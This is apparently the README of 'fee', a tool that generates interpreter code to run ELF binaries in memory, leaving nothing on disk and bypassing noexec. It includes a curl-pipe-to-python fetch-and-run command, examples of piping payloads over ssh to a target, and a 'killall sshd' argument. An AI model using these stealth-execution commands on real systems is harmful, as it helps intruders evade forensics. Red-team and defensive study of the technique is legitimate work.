## Execute ELF files on a machine without dropping an ELF

[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

### Description

This Python script generates interpreted code which creates the supplied ELF as a file in memory and executes it (without tmpfs). This makes it possible to execute binaries without leaving traces on the disk.

The technique used for this is explained [here](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html).

With default options for each interpreter, running binaries using `fee` does not write to disk whatsoever. This can be verified using tools such as `strace`.

`fee` also completely ignores and bypasses `noexec` mount flags, even if they were set on `/proc`.


### Target requirements

 * kernel: 3.17 or later (for `memfd_create` support)
 * An interpreter. Any of these:
   * Python 2
   * Python 3
   * Perl
   * Ruby


### Installation

Install this on your host machine using [pipx](https://github.com/pypa/pipx):
```console
$ pipx install fee
```

... or regular pip:
```console
$ pip install --user fee
```

You may also clone this repository and run the script directly.

### Usage

Basic usage: supply the path to the binary you wish to drop:

```console
$ fee /path/to/binary > output.py
```

You can then pipe this into Python on the target:

```console
$ curl my.example.site/output.py | python
```

Alternatively, you may generate Perl or Ruby code instead with the `--lang` flag (`-l`):
```console
$ fee /path/to/binary -l pl | perl
```

```console
$ fee /path/to/binary -l rb | ruby
```

If you want to pipe over ssh, use the `--with-command` flag (`-c`) to wrap the output in `python -c` (or `perl -e`, `ruby -e` accordingly):

```console
$ fee -c /path/to/binary | ssh user@target
```

When piping over ssh, you sometimes want to wrap the long line which holds the base64-encoded version of the binary, as some shells do not like super long input strings. You can accomplish this with the `--wrap` flag (`-w`):
```console
$ fee -c /path/to/binary -w 64 | ssh user@target
```

If you want to customise the arguments, use the `--argv` flag (`-a`):

```console
$ fee -a "killall sshd" ./busybox > output.py
```

**If you don't wish to include the binary in the generated output**, you can instruct `fee` to generate a script which accepts the ELF from stdin at runtime. For this, use `-` for the filename. You can combine all of these options for clever one-liners:
```console
$ ssh user@target "$(fee -c -a "echo hi from stdin" -t "libc" -)" < ./busybox

hi from stdin
```

__NB!__ By default, the script parses the encoded ELF's header to determine the target architecture. This is required to use the correct syscall number when calling `memfd_create`. If this fails, you can use the `--target-architecture` (`-t`) flag to explicitly generate a syscall number. Alternatively, you can use the `libc` target to resolve the symbol automatically at runtime, although this only works when generating Python code.
For more exotic platforms, you should specify the syscall number manually. You need to search for `memfd_create` in your target's architecture's syscall table. This is located in various places in the Linux kernel sources. Just Googling `[architecture] syscall table` is perhaps the easiest. You can then specify the syscall number using the `--syscall` flag (`-s`).

Full help text:
```
usage: fee.py [-h] [-t ARCH | -s NUM] [-a ARGV] [-l LANG] [-c] [-p PATH] [-w CHARS] [-z LEVEL]
              path

Print code to stdout to execute an ELF without dropping files.

positional arguments:
  path                  path to the ELF file (use '-' to read from stdin at runtime)

optional arguments:
  -h, --help            show this help message and exit
  -t ARCH, --target-architecture ARCH
                        target platform for resolving memfd_create (default: detect from ELF)
  -s NUM, --syscall NUM
                        syscall number for memfd_create for the target platform
  -a ARGV, --argv ARGV  space-separated arguments (including argv[0]) supplied to execle (default:
                        path to file as argv[0])
  -l LANG, --language LANG
                        language for the generated code (default: python)
  -c, --with-command    wrap the generated code in a call to an interpreter, for piping directly
                        into ssh
  -p PATH, --interpreter-path PATH
                        path to interpreter on target if '-c' is used, otherwise a sane default is
                        used
  -w CHARS, --wrap CHARS
                        when base64-encoding the elf, how many characters to wrap to a newline
                        (default: 0)
  -z LEVEL, --compression-level LEVEL
                        zlib compression level, 0-9 (default: 9)
```
